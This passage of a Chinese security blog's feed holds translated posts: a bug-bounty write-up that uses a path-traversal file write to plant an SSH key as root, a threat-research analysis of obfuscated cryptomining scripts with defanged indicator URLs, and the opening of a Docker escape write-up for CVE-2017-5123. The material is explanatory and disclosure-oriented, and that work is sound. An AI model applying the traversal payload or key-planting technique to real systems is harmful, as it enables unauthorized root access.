  &lt;li&gt;You are not a Computer Forensic Specialist if what you konw is just to check the system logs from any error message and to run anti-virus software to find out whether or not the system is infected by viruses. To be called a Computer Forensics Specialist, you need to be able to perform proper data acquisition of the evidence from HDD or any other storage, to preserve it well and ensure it is adminssible to the court during trials, to be able to dig deeper down to the file system level of different OSes to find out artifacts of events being investigate, detecting and recovering deleted files from slack spaces and even to recover evidence from volume shadow copies, registry entries, prefetch data, etc. You also need to be proficient with handling volatile memory, know how to acquire them as well as to find malicious code could possibly hiding into other legitimate process(es) via process hollowing, etc.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;你不能算是一個&lt;strong&gt;計算機鑑識專家&lt;/strong&gt;，如果你只是看看系統日誌的錯誤訊息，並運行防毒軟體來確認是否有感染跡象。要想當個 real 的計算機鑑識專家，你要會從 HDD 或其他存儲裝置獲取恰當的跡證資料，並將之保存得當並確定這是可以在審訊中做為依據的。要能深入不同作業系統上的檔案系統層級，去找尋正在調查的人為事件、偵測並從殘餘空間復原被刪除的檔案，甚至從 volume shadow 拷貝、註冊表、prefetch file 等等來復原證據，你也需要專業到可以處理揮發性記憶體，知道如何從中取得可能存在合法形成中的惡意程式碼。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Hope this article could provide some insight to any HR practitioner specializing in InfoSec recruitment or to any hiring managers that are truly looking for a better (if not one of the best) InfoSec Specilists out there to perform a real challenging jobs that required their true expertise of their respective fields.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;希望這個文章可以讓與資安相關的 HR 從業人員或人事經理多了解一點，在資安相關工作雇用上可以找到好一點的(如果不是要最好的)資安專家，來實踐一些真正需要他們專業及屌炸天的技能來應付的挑戰。&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>jhe</name></author><category term="InfoSec" /><category term="forensics" /><category term="Penetration Test" /><category term="Reversing Engineering" /><summary type="html">Well, you are not a “Security Specialist” if you …</summary></entry><entry><title type="html">沒有RCE？那就直接SSH進去啊！</title><link href="https://security-onigiri.github.io//2018/04/18/rcessh.html" rel="alternate" type="text/html" title="沒有RCE？那就直接SSH進去啊！" /><published>2018-04-18T00:00:00+08:00</published><updated>2018-04-18T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/04/18/rcessh</id><content type="html" xml:base="https://security-onigiri.github.io//2018/04/18/rcessh.html">&lt;p&gt;&lt;del&gt;何不食肉糜?&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;[&lt;img src=&quot;http://blog.jr0ch17.com/images/2017-11-08_12h39_35.png&quot; alt=&quot;My Profile Photo&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://blog.jr0ch17.com/&quot; title=&quot;link to home of Jasmin Landry, a.k.a JR0ch17&quot;&gt;&lt;strong&gt;Jasmin Landry, a.k.a JR0ch17&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;2018年1月25日 • 在&lt;a href=&quot;http://blog.jr0ch17.com/tags/#bugbounty&quot;&gt;bugbounty &lt;/a&gt;、&lt;a href=&quot;http://blog.jr0ch17.com/tags/#rce&quot;&gt;RCE &lt;/a&gt;、&lt;a href=&quot;http://blog.jr0ch17.com/tags/#shell&quot;&gt;Shell&lt;/a&gt;、&lt;a href=&quot;http://blog.jr0ch17.com/tags/#lfd&quot;&gt;LFD &lt;/a&gt;、&lt;a href=&quot;http://blog.jr0ch17.com/tags/#xss&quot;&gt;XSS &lt;/a&gt;、&lt;a href=&quot;http://blog.jr0ch17.com/tags/#xxe&quot;&gt;XXE &lt;/a&gt;、&lt;a href=&quot;http://blog.jr0ch17.com/tags/#ssh&quot;&gt;SSH &lt;/a&gt;&lt;/p&gt;

&lt;p&gt;這篇博文是關於我的第一篇 &lt;del&gt;RCE&lt;/del&gt; shell（或者隨便你想怎麼叫它），是篇我在2017年夏季獲得了一個Bug Bounty(錯誤賞金)計劃。這絕對沒有什麼特別之處，你甚至可能不會學到任何新東西，但如果你這樣做，我很高興我能幫你！我只是覺得這是一種獲得一個盒子的不同方式，特別是在Bug Bounty方面。&lt;/p&gt;

&lt;h3 id=&quot;偵察總是挺有趣的&quot;&gt;偵察總是挺有趣的&lt;/h3&gt;

&lt;p&gt;使用&lt;a href=&quot;https://github.com/aboul3la/Sublist3r&quot;&gt;Sublist3r&lt;/a&gt;，&lt;a href=&quot;https://github.com/michenriksen/aquatone&quot;&gt;Aquatone&lt;/a&gt;，&lt;a href=&quot;https://nmap.org/&quot;&gt;Nmap&lt;/a&gt;等工具對*.domain.com 範圍內的網域進行定期偵察後，我最終列出了數百個子域。我不知道從哪裡開始，因此我決定使用&lt;a href=&quot;https://github.com/ChrisTruncer/EyeWitness&quot;&gt;EyeWitness&lt;/a&gt;截取網頁截圖，以便了解哪些目標看起來很脆弱，以便我可以從這些截圖開始破冰。在EyeWitness報告中，有一個應用程序在8080埠上運行，它有一個我從未聽說過的CMS的默認主頁，因此我決定首先查看是那個CMS。通過瀏覽目標，我很快找到了一個登錄頁面，幸運的是，我的默認憑據是 &lt;strong&gt;admin：admin&lt;/strong&gt;。然而，它的管理面板中完全沒有任何東西，沒甚麼有料的訊息，完全沒有，它根本是空的。但我仍然決定將它以&lt;strong&gt;“管理面板中的默認憑據”&lt;/strong&gt;為標題的問題報告給Bug Bounty計劃，幸運的是即使我沒有獲得任何敏感訊息，他們也願意將其作為一個重要的bug進行獎勵。&lt;/p&gt;

&lt;h3 id=&quot;jobert的名言&quot;&gt;Jobert的名言&lt;/h3&gt;

&lt;p&gt;僅僅通過默認主頁的外觀以及它在管理面板中的樣子，我覺得應該還有更多細節在裡面。正如&lt;a href=&quot;https://twitter.com/jobertabma&quot;&gt;Jobert&lt;/a&gt;曾經說過的那樣，&lt;em&gt;如果它看起來很老很脆弱，那很可能就是你想的那樣！&lt;/em&gt;我決定看看CMS的網站，看看我能否獲得更多的訊息。這是一個開源軟體，所以我想我會在AWS上啟動一個EC2實例並將它安裝在那裡，以便我可以自己玩。我注意到該服務必須以sudo權限運行，這顯然不是最佳實作方式（稍後請牢記這點）。完成設置後，我做了一個快速的Google搜索，看看能否找到該軟體的任何現有CVE，有趣的是，再也找不到任何東西。所以這意味著很有可能沒有人對此軟體進行安全審查或滲透測試。我知道事實後該秀一波了!
&lt;a href=&quot;https://memecreator.org/static/images/memes/3013268.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;簡潔快速的去發現些甚麼吧&quot;&gt;簡潔快速的去發現些甚麼吧&lt;/h3&gt;

&lt;p&gt;我瀏覽了大約30分鐘到一個小時，以便很好地了解它是如何運作的。在我這樣做的時候，我很快找到了2個XSS; 一個存儲型，一個及時反應型。然後在檢查Burp Suite中的所有請求後，我最終找到了1個LFD和2個XXE。它有很多API終端，所以我查看了他們的API文檔，並很快意識到在該CMS上的每個可能的操作都有不正確的訪問控制。這意味著未經身份驗證的遠程攻擊者可以利用存儲的XSS，LFD和兩個XXE攻擊其自身，甚至無需登錄管理頁面。最重要的是，它也沒有CSRF保護，所以如果攻擊者不想利用這些漏洞，他們也可以很容易地創建一些CSRF攻擊並嘗試讓管理員為他們自動做這件事！&lt;/p&gt;

&lt;h3 id=&quot;directory-traversal救世界&quot;&gt;/directory traversal救世界！&lt;/h3&gt;

&lt;p&gt;此時此刻我已經預見，在這個CMS上成功製造RCE只是一個時間的問題。我只是需要繼續探索，然後我最終絕對會找到一個。我之前發現的一個有趣的終端是我可以更新模板文件。它有趣的點是它用於更新模板的參數。下面這就是它的樣子。 &lt;strong&gt;&lt;em&gt;(所有敏感信息已處理)&lt;/em&gt;&lt;/strong&gt;
&lt;img src=&quot;http://blog.jr0ch17.com/images/POST_request.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在成功更新後，回覆將如下所示。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://blog.jr0ch17.com/images/POST_Response.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我必須嘗試的下一個邏輯是將路徑更改為其他內容，用以查看是否可以將文件上傳到&lt;code class=&quot;highlighter-rouge&quot;&gt;/config&lt;/code&gt;文件夾中。所以我給了它如下路徑:&lt;code class=&quot;highlighter-rouge&quot;&gt;/../../../../../../../../../../../../tmp/test.txt&lt;/code&gt;並用&lt;code class=&quot;highlighter-rouge&quot;&gt;This is a test.&lt;/code&gt;替換了POST的主體。我得到了與以前的請求相同的Response…太神啦！但是，我接下來該如何確認該文件是否已真正上傳完成了？不要忘記，這個測試是在我自己的伺服器上完成的，所以我可以自己檢查文件是否在那裡，但這太白箱了。我想走黑箱路線並找到另一種方法來確認這件事。於是就請到LFD來拯救世界啦！使用我已經發現的LFD/directory traversal來幫助我檢查確認文件是否完成上傳。而它真的上去了！ 
&lt;img src=&quot;http://blog.jr0ch17.com/images/LFI.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;沒有rce現在該怎麼辦&quot;&gt;沒有RCE，現在該怎麼辦？&lt;/h3&gt;

&lt;p&gt;好了！現在我知道我們可以上傳文件，而且不僅僅是傳到伺服器上的某些固定位置，我可以將它們上傳到任何我想要的地方，因為服務是以root權限運行。&lt;/p&gt;

&lt;p&gt;當然，下一步是嘗試執行我上傳的文件嗎？那麼，事實證明，對我來說實際上是一個問題。該服務在Tomcat中是作為一個&lt;code class=&quot;highlighter-rouge&quot;&gt;war&lt;/code&gt;文件進行部署，所以沒有一個真正可以上傳和執行文件的特定路徑。也許如果有別人幫助的話，我可能已經想出如何解決這一點的方法，但由於我不太熟悉又沒人幫助，所以我很不幸的在那個時候無法做任何事情往下深入。這讓我回想起我在OSCP工作的日子。我手邊仍然有我的筆記，所以我翻了翻他們，並藉此獲得了一些想法。我首先上傳了一個bash腳本到&lt;code class=&quot;highlighter-rouge&quot;&gt;cron.hourly&lt;/code&gt;資料夾，但使用默認的操作系統配置，但這步棋並沒有成功。假設Bug Bounty計劃具有相同的默認設置，那麼這招很可能也無法成功運作。然後我告訴自己:好吧，我手上有root權限了，為什麼不直接SSH連到盒子裡？&lt;/p&gt;

&lt;p&gt;為此，我必須將我的SSH密鑰上傳到伺服器。這很簡單，我只需要相應地配置路徑參數，並將我的SSH密鑰放在POST請求的主體中。 
&lt;img src=&quot;http://blog.jr0ch17.com/images/SSH.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;剩下的最後一件事就是嘗試用我新上傳的SSH密鑰登錄。你看看，這不就成功了？&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://blog.jr0ch17.com/images/ID.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;現在我已經完成了我的目標，我決定是時候報告這些錯誤了。我聯繫了CMS的開發團隊，讓他們知道這些漏洞，他們立即回答我是否想加入他們的Slack團隊，以便我們可以更多地討論我的報告。我們通過幾次電話聯繫來澄清幾點，他們讓我在更新發布之前先測試看看他們的新版本。&lt;/p&gt;

&lt;p&gt;我還將這些錯誤報告給使用該CMS的Bug Bounty計劃。我顯然沒有在他們的網站上測試任何東西，因為它不符合道德規範，但我確實為我的所有發現提供了一個清晰的PoC，要求他們測試他們的結果。我的所有報告都經過了驗證並被接受，其中也一併包括SSH密鑰的文件上傳的部分。這是我被認可的第一個“RCE”的Bug Bounty計劃！&lt;/p&gt;

&lt;p&gt;如有任何問題或意見，請不要猶豫，直接在Twitter上DM我吧~ :)&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="Web" /><category term="Bug Bounty" /><category term="Penetration Test" /><summary type="html">何不食肉糜?</summary></entry><entry><title type="html">挖礦JavaScript代碼的感染趨勢</title><link href="https://security-onigiri.github.io//2018/04/18/javascript.html" rel="alternate" type="text/html" title="挖礦JavaScript代碼的感染趨勢" /><published>2018-04-18T00:00:00+08:00</published><updated>2018-04-18T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/04/18/javascript</id><content type="html" xml:base="https://security-onigiri.github.io//2018/04/18/javascript.html">&lt;p&gt;威脅研究&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;作者 &lt;a href=&quot;https://www.fortinet.com/blog/search.html?author=Eric+Chong&quot;&gt;Eric Chong&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;2018年2月8日&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;1-charcode-javascript&quot;&gt;1. CharCode JavaScript&lt;/h2&gt;
&lt;p&gt;2017年12月6日，FortiGuard實驗室發現了一個被入侵的網站 - acenespargc.com。查看源碼，我們注意到一個可疑的加密腳本，它使用eval（）函數將所有字符轉換為數字。我們使用了一個名為&lt;a href=&quot;http://jdstiles.com/java/cct.html&quot;&gt;CharCode Translator&lt;/a&gt;的工具將這些數字轉換  回程式碼。然後我們就可以反查到將使用者轉址到詐騙網頁或釣魚網站的鏈接。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/p2wS40L.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;第1部分&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/emTmBaL.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;第2部分&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;以上只是一個簡單的例子。犯罪者實際上可以根據地理位置自定義釣魚的內容，為了更好地避開檢測機制，它會在檢測到您之前曾訪問過釣魚頁面時消失。&lt;/p&gt;

&lt;p&gt;使用這種技術，犯罪者可以隱藏惡意/網路釣魚/廣告URL，以免被肉眼看到。&lt;/p&gt;

&lt;p&gt;正如你將在下面看到的，犯罪者現在已經採用這種技術來隱藏在受感染的網站中挖掘加密貨幣的JavaScript，這樣任何訪問該網站的人都將“受到感染”，並且他們的電腦將持續為犯罪者提供加密演算資源。我們將此類活動歸類為惡意行為，因為它未經其許可使用其他人的資源。&lt;/p&gt;

&lt;h2 id=&quot;2使用打包工具隱藏coinhive腳本&quot;&gt;2.使用打包工具隱藏CoinHive腳本&lt;/h2&gt;

&lt;p&gt;在12月28日，FortiGuard實驗室通過一位客戶的關係發現了另一個惡意網站正使用我們上面介紹的混淆技巧 - romance-fire[.]com。該網站包含用於加密貨幣挖掘的混淆惡意代碼。&lt;/p&gt;

&lt;p&gt;我們發現了編碼腳本，並使用&lt;a href=&quot;http://matthewfl.com/unPacker.html&quot;&gt; packer tool &lt;/a&gt;來解壓縮腳本，發現該腳本與CoinHive有連接。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/jyV0AJw.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;來自源代碼的JavaScript&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/IjGjCUr.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;解壓縮JavaScript - 第1部分&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;我們注意到URL（hxxp：//3117488091/lib/jquery-3.2.1.min.js？v=3.2.11）似乎不是有效的IP或網域。於是我們做了一些研究，我們在&lt;a href=&quot;http://www.kloth.net/services/iplocate.php&quot;&gt;KLOTH.NET&lt;/a&gt;上轉換它後，發現’3117488091’是185.209.23.219的十進制IP。以下是結果：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/jO6HlvS.png&quot; alt=&quot;&quot; /&gt;
該網站將URL轉換為&lt;code class=&quot;highlighter-rouge&quot;&gt;hxxp：//185.209.23.219/lib/jquery-3.2.1.min.js？v=3.2.11)&lt;/code&gt;。我們從該URL中查到相同的JavaScript模式，因此我們再次解壓縮腳本。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/Z32sbbB.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;解壓縮JavaScript - 第2部分&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;在最後一輪解包之後，我們終於能夠查看包含CoinHive URL的完整程式碼：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/TU9SUa0.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;解壓縮JavaScript - 第3部分&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;3來自github的coin礦工&quot;&gt;3.來自GitHub的Coin礦工&lt;/h2&gt;

&lt;p&gt;2018年1月26日，我們發現了另一個網站 - sorteosrd[。]com，它也通過劫持訪問者的CPU來挖掘加密貨幣。這種加密惡意軟體再次允許劫持者在未經該電腦用戶許可的情況下藉由挖掘數位貨幣受益。我們相信這個網站可能已被挾持或網站管理員自己本身如此使用。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/QNmQTW1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hxxp：//sorteosrd.com網站的源代碼：&lt;/code&gt;
&lt;img src=&quot;https://i.imgur.com/RSEb8qr.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;暗中加密對用戶設備的影響&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;正如我們從上面的截圖中可以看到的那樣，加密貨幣挖礦機在訪問該網站後充分利用其CPU時會大大降低PC的速度。&lt;/p&gt;

&lt;h2 id=&quot;4被挾持的網站---感染cryptocoin挖礦的黑莓&quot;&gt;4.被挾持的網站 - 感染CryptoCoin挖礦的黑莓&lt;/h2&gt;
&lt;p&gt;CoinHive腳本的另一個被挾持的例子是一個絕對會令人驚訝的網站 - blackberrymobile[.]com上發現的。
&lt;img src=&quot;https://i.imgur.com/wjclu4E.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;即使是黑莓網站也在短時間內被盜用在挖掘Monero加密貨幣。&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;5被挾持的網站---milk-new-zealand-感染-deepminer-工具&quot;&gt;5.被挾持的網站 - Milk New Zealand 感染 deepMiner 工具&lt;/h2&gt;
&lt;p&gt;此外，我們還發現New Zealand最大的日記農場集團之一──Milk New Zealand也遭到了破壞。我們的AntiVirus實驗室檢測到來自該網站的惡意活動，所以我們查看他的源碼，發現其有使用github上的deepMiner工具，其中發現了一個用於挖掘Monero、Electroneum、Sumokoin等的腳本。請參見下面的截圖：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/QXgfpMu.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;使用deepMiner的JavaScript&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;根據上面屏幕截圖中的數據，我們了解到，這種腳本在其網域中使用DDNS，並且只會將CPU使用率增加50％，以使終端用戶受害者的負面使用者體驗不太明顯。&lt;/p&gt;

&lt;h2 id=&quot;6甚至youtube也會通過投放挖礦廣告&quot;&gt;6.甚至YouTube也會通過投放挖礦廣告&lt;/h2&gt;

&lt;p&gt;加密貨幣挖掘惡意軟體的問題越來越嚴重。隨著希望通過劫持CPU以從加密貨幣獲得收益的犯罪者數量不斷增加，加密技術越來越多地出現在惡意軟體中。一周前，一位犯罪者設法將挖礦腳本注入到線上廣告中後，幾個惡意廣告隨即在YouTube上彈出。幸運的是，YouTube迅速發現了該問題，並在兩小時內刪除了受影響的廣告。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/CO4RnSz.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;惡意加密YouTube廣告&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;你能做些什麼來防止或避免coin-miner劫持&quot;&gt;你能做些什麼來防止或避免Coin Miner劫持？&lt;/h2&gt;

&lt;p&gt;清除瀏覽器緩存，或安裝ccleaner軟體，從電腦中查找並刪除不需要的文件和無效的Windows註冊表項。
在瀏覽器中禁用JavaScript或運行腳本攔截工具或附加元件。
安裝防病毒軟體，如FortiClient。
安裝並運行AdBlocker或類似的工具，例如Ghostery。
FortiGuard已將此Blog中列出的所有URL列進黑名單。&lt;/p&gt;

&lt;h2 id=&quot;iocs&quot;&gt;IOCs:&lt;/h2&gt;

&lt;p&gt;被挾持的網站：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;acenespargc[.]com&lt;/li&gt;
  &lt;li&gt;www[.]romance-fire[.]com&lt;/li&gt;
  &lt;li&gt;milknewzealand[.]com&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;已觀察到的虛擬貨幣挖掘網址：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;hxxp://coinhive[.]com&lt;/li&gt;
  &lt;li&gt;hxxp://minerhills[.]com&lt;/li&gt;
  &lt;li&gt;hxxp://crypto-webminer[.]com&lt;/li&gt;
  &lt;li&gt;hxxp://sorteosrd[.]com&lt;/li&gt;
  &lt;li&gt;hxxp://greenindex[.]dynamic-dns[.]net&lt;/li&gt;
  &lt;li&gt;hxxps://github[.]com/deepwn/deepMiner&lt;/li&gt;
&lt;/ul&gt;</content><author><name>NotSurprised</name></author><category term="Web" /><category term="Coin Miner" /><category term="Obfuscation Technique" /><summary type="html">威脅研究</summary></entry><entry><title type="html">使用 CVE-2017-5123 逃離 Docker 容器</title><link href="https://security-onigiri.github.io//2018/03/31/Escaping-Docker-container-using-CVE-2017-5123.html" rel="alternate" type="text/html" title="使用 CVE-2017-5123 逃離 Docker 容器" /><published>2018-03-31T00:00:00+08:00</published><updated>2018-03-31T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/03/31/Escaping-Docker-container-using-CVE-2017-5123</id><content type="html" xml:base="https://security-onigiri.github.io//2018/03/31/Escaping-Docker-container-using-CVE-2017-5123.html">&lt;p&gt;The post describes how I exploited the &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; vulnerability in order to modify the &lt;a href=&quot;https://www.kernel.org/pub/linux/libs/security/linux-privs/kernel-2.2/capfaq-0.2.txt&quot;&gt;Linux capabilities&lt;/a&gt; of a Docker container to gain elevated privileges, and ultimately escape the container jail. If you wnat to see how Twistlock would stop this vulnerability in its tracks, check out my follow up blog.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;這篇文章描述我如何利用 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; 修改 Docker 容器的 Linux capabilities 從而取得更高的權限，最後逃離了容器監獄。如果你想要看看 Twistlock 如何在他的軌跡中阻止這個弱點，在這篇&lt;a href=&quot;https://www.twistlock.com/2018/01/16/blocking-malicious-behavior-exploits-containers-twistlock/&quot;&gt;文章&lt;/a&gt;有。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;But before we dive in, since an image is worth a thousand words, here is my exploit in action. It modifies the containerized process capabilities structure in memory, resulting in a gain of &lt;code class=&quot;highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;CAP_NET_ADMIN&lt;/code&gt; capabilities. This results in the ability to enable promiscuous mode on &lt;code class=&quot;highlighter-rouge&quot;&gt;eth0&lt;/code&gt;(docker bridge for the container):&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;但在我們深入之前，一張圖勝過千言萬語，這是我的利用過程。它修改容器化行程在記憶體中的 capabilities 結構，導致取得 &lt;code class=&quot;highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; 與 &lt;code class=&quot;highlighter-rouge&quot;&gt;CAP_NET_ADMIN&lt;/code&gt; capabilities。這意味著有能力開啟 &lt;code class=&quot;highlighter-rouge&quot;&gt;eth0&lt;/code&gt;(容器的 docker bridge) 的混沌模式&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=IdRDFS4u2rQ&quot;&gt;Youtube 影片&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Note that I have turn off &lt;code class=&quot;highlighter-rouge&quot;&gt;Kernel ASLR&lt;/code&gt; for the recording, but it also works with &lt;code class=&quot;highlighter-rouge&quot;&gt;KASLR&lt;/code&gt; as we can find the kernel base and the heap base by using the same vulnerability.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;請留意我在影片中已經關掉 &lt;code class=&quot;highlighter-rouge&quot;&gt;Kernel ASLR&lt;/code&gt;，但在 &lt;code class=&quot;highlighter-rouge&quot;&gt;KASLR&lt;/code&gt; 的狀態下依然可以藉由同一個弱點成功找到核心基址與堆積基址。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;CVE-2017-5123 was published earlier this year on Oct 12 - it was a Linux kernel vulnerability in the &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; syscall for 4.12-4.13 kernel versions. The &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; syscall defined as:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://access.redhat.com/security/cve/cve-2017-5123&quot;&gt;CVE-2017-5123&lt;/a&gt; 是今年 8 月 12 日發布 - 它是一個在 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; 系統呼叫的 Linux 核心 4.12-4.13 版本弱點。&lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; 系統呼叫定義為：&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;int waitid(idtype_t idtype, it_t id, siginfo_t *infop, int options);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The vulnerability allows an attacker to write a partially-controlled data to kernel memory address of his choice. The kernel memory address can be provided as the&lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt;pointer above. The pointer points to a struct siginfo described below. In this struct we can control sveral variables, specifically pid and status.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;該弱點允許一個攻擊者寫入部份可控資料到攻擊者選擇的核心記憶體位址中。核心記憶體位址可以由&lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt;指標提供。這個指標指向一個結構&lt;code class=&quot;highlighter-rouge&quot;&gt;siginfo&lt;/code&gt;如下所述。在這個結構我們可以控制數個變數，特別是&lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt;與&lt;code class=&quot;highlighter-rouge&quot;&gt;status&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As you can see below, the control is rather indirect.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;下面如你所見，這個控制相當不直接。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;struct siginfo {
    int si_signo;
    int si_errno;
    int si_code;
    int padding; // this remains unchaged by waitid
    int pid;     // process id
    int uid;     // user id
    int status;  // return code
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Most of the values cannot be controlled by us or are limited in their size for our needs, however we can control the &lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt; value by creating a lot of processes with the help of &lt;code class=&quot;highlighter-rouge&quot;&gt;fork()&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;clone()&lt;/code&gt; until we hit the desired &lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt; value. Still, we are limited by the &lt;code class=&quot;highlighter-rouge&quot;&gt;PID_MAX&lt;/code&gt; value of the system, which is by default configured to be 32768 which equals to 0x8000 in hex.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;多數的數值無法被我們控制，或是對我們來說在大小方面有所限制，然而我們可以藉由&lt;code class=&quot;highlighter-rouge&quot;&gt;fork()&lt;/code&gt;或&lt;code class=&quot;highlighter-rouge&quot;&gt;clone()&lt;/code&gt;的幫助創造很多行程，來控制 &lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt;的值，直到我們觸碰到想要的&lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt;為止。但我們仍受限於系統中&lt;code class=&quot;highlighter-rouge&quot;&gt;PID_MAX&lt;/code&gt;的值，預設為 &lt;em&gt;32768&lt;/em&gt; 等於 十六進位 &lt;em&gt;0x8000&lt;/em&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Note: In a non-containerized environment we could elevate this number after changing our &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; to 0 and gain root privileges, as we could modify &lt;code class=&quot;highlighter-rouge&quot;&gt;/proc/sys/kernel/pid_mx&lt;/code&gt; to any number.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;註：在一個非容器的環境，我們可以在將 &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; 設為0後提高這個數字，並取得 root 權限，如同我們可以修改 &lt;code class=&quot;highlighter-rouge&quot;&gt;/proc/sys/kernel/pid_max&lt;/code&gt; 為任何數字。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;linux-capabilities&quot;&gt;Linux Capabilities&lt;/h2&gt;

&lt;p&gt;In this section I’ll focus on a short overview of Linux capabilities - what they are, how Docker uses them, and how they are represented in the memory.&lt;/p&gt;

&lt;blockquote&gt;
